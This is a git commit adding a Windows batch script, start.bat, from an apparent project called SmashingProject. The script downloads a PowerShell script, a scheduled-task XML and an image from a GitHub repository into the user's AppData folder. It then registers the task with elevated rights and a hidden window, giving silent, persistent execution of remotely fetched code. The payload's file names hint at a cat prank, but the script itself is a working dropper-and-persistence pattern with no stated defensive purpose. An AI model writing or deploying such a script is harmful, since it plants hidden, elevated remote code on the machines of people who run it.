1efbf99fd38d548474c4c87711553996db7d9a1a
ivan123456 <48185734+vanos03@users.noreply.github.com>
2025-04-03 14:00:35 +0300

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,19 @@
+set WORKDIR=%appdata%\Test
+
+set TASK_OUT=%WORKDIR%\taskchd_rule.xml
+set CAT_SCRIPT_OUT=%WORKDIR%\print_cat.ps1
+set CAT_IMAGE_OUT=%WORKDIR%\cat.jpg
+set TASK_NAME=ТЕСТ
+
+set TASK_OUT_URI=https://raw.githubusercontent.com/vanos03/SmashingProject/refs/heads/main/taskchd_rule.xml
+set CAT_SCRIPT_URI=https://raw.githubusercontent.com/vanos03/SmashingProject/refs/heads/main/print_cat.ps1
+set CAT_IMAGE_URI=https://raw.githubusercontent.com/vanos03/SmashingProject/refs/heads/main/cat.jpg
+
+
+mkdir "%WORKDIR%"
+
+powershell -Command "Invoke-WebRequest -Uri "%TASK_OUT_URI%" -OutFile "%TASK_OUT%""
+powershell -Command "Invoke-WebRequest -Uri "%CAT_SCRIPT_URI%" -OutFile "%CAT_SCRIPT_OUT%""
+powershell -Command "Invoke-WebRequest -Uri "%CAT_IMAGE_URI%" -OutFile "%CAT_IMAGE_OUT%""
+
+powershell Start-Process schtasks -ArgumentList '/Create', '/XML', '%TASK_OUT%', '/TN', '%TASK_NAME%' -Verb RunAs -WindowStyle Hidden
